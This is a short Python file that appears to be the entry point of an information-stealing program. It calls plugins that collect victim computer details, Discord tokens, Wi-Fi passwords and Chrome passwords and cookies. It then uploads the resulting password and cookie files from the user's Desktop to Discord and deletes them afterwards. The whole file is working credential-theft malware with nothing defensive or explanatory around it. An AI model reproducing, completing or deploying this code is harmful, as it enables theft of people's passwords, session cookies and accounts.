from plugins.get_victim_information import get_computer_information
from plugins.get_discord_tokens import steal_discord_tokens
from plugins.get_wifi_passwords import *
from plugins.get_chrome_information import *
import importlib

def dynamic_import(module_name, func_name):
    module = importlib.import_module(module_name)
    func = getattr(module, func_name)
    return func

def run_plugins():
    print("Oi")
    dynamic_import(__name__, 'extract_chrome_password')()
    dynamic_import(__name__, 'extract_chrome_cookie')()
    dynamic_import(__name__, 'send_file_to_discord')(os.path.join(os.environ["USERPROFILE"], "Desktop", "passwords.txt"), 'Passwords File')
    dynamic_import(__name__, 'send_file_to_discord')(os.path.join(os.environ["USERPROFILE"], "Desktop", "cookies.txt"), 'Cookies File')
    dynamic_import(__name__, 'delete_files')()

if __name__ == '__main__':
    run_plugins()
